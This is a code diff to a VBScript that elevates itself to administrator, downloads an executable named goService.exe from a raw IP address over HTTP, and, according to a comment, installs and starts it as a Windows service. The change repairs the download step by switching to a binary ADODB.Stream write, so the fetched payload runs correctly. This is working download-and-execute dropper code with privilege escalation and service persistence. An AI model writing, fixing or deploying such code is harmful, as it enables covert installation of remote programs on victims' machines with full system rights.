@@ -5,7 +5,7 @@ If Not WScript.Arguments.Named.Exists("elevated") Then
 End If
 
 ' Now running as admin, proceed with the script
-Dim url, downloadPath, objXMLHTTP, objFSO, objFile, objShell
+Dim url, downloadPath, objXMLHTTP, objStream, objShell
 url = "http://51.81.73.108:5552/uploads/goService.exe"
 downloadPath = "C:\Sys\goService.exe"
 
@@ -15,10 +15,13 @@ objXMLHTTP.Open "GET", url, False
 objXMLHTTP.Send
 
 If objXMLHTTP.Status = 200 Then
-    Set objFSO = CreateObject("Scripting.FileSystemObject")
-    Set objFile = objFSO.CreateTextFile(downloadPath, True)
-    objFile.Write objXMLHTTP.ResponseBody
-    objFile.Close
+    ' Create a stream object to handle binary data
+    Set objStream = CreateObject("ADODB.Stream")
+    objStream.Type = 1 ' Binary data
+    objStream.Open
+    objStream.Write objXMLHTTP.ResponseBody
+    objStream.SaveToFile downloadPath, 2 ' Save as a file and overwrite if exists
+    objStream.Close
 End If
 
 ' Install and start the service using the downloaded file
